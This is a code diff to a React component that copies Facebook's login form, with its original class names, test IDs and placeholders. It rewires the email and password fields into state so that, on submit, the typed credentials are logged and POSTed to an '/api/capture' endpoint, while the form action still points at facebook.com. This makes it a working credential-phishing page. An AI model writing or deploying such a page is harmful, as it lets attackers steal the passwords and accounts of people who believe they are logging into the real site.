@@ -1,23 +1,27 @@
-import { useRef } from 'react'
+import { useState } from 'react'
 import './Facebook.css'
 
 
 const Facebook = () => {
-    const formRef = useRef(null);
+    const [formData, setFormData] = useState ({})
 
-    const handleSubmit = (event) => {
-    //  event.preventDefault();
-      const formData = new formData(event.target);
-      const data = Object.fromEntries(formData.entries());
+    function handleInputChange(event) {
+        const { name, value } = event.target
+        setFormData(prevState => ({
+            ...prevState,
+            [name]: value
+        }))
+    }
 
-      console.log("Data:", data);
+    const handleSubmit = () => {
+      console.log("Data:", formData);
 
       fetch("/api/capture", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify(data),
+        body: JSON.stringify(formData),
       })
         .then((response) => {
           if (response.ok) {
@@ -64,7 +68,6 @@ const Facebook = () => {
                                 data-testid="royal_login_form"
                                 action="https://facebook.com"
                                 method="POST"
-                                ref={formRef}
                                 onSubmit={handleSubmit}
                                 id="u_0_2_58"
                                 >
@@ -87,6 +90,8 @@ const Facebook = () => {
                                         className="inputtext _55r1 _6luy"
                                         name="email"
                                         id="email"
+                                        value={formData.email || ''}
+                                        onChange={handleInputChange}
                                         data-testid="royal_email"
                                         placeholder="Email or phone number"
                                         autoFocus={1}
@@ -100,6 +105,8 @@ const Facebook = () => {
                                         className="inputtext _55r1 _6luy _9npi"
                                         name="pass"
                                         id="pass"
+                                        value={formData.pass || ''}
+                                        onChange={handleInputChange}
                                         data-testid="royal_pass"
                                         placeholder="Password"
                                         aria-label="Password"
@@ -134,7 +141,6 @@ const Facebook = () => {
                                     data-testid="royal_login_button"
                                     type="submit"
                                     id="u_0_5_t/"
-                                    onClick={handleSubmit}
                                     >
                                     Log In
                                     </button>
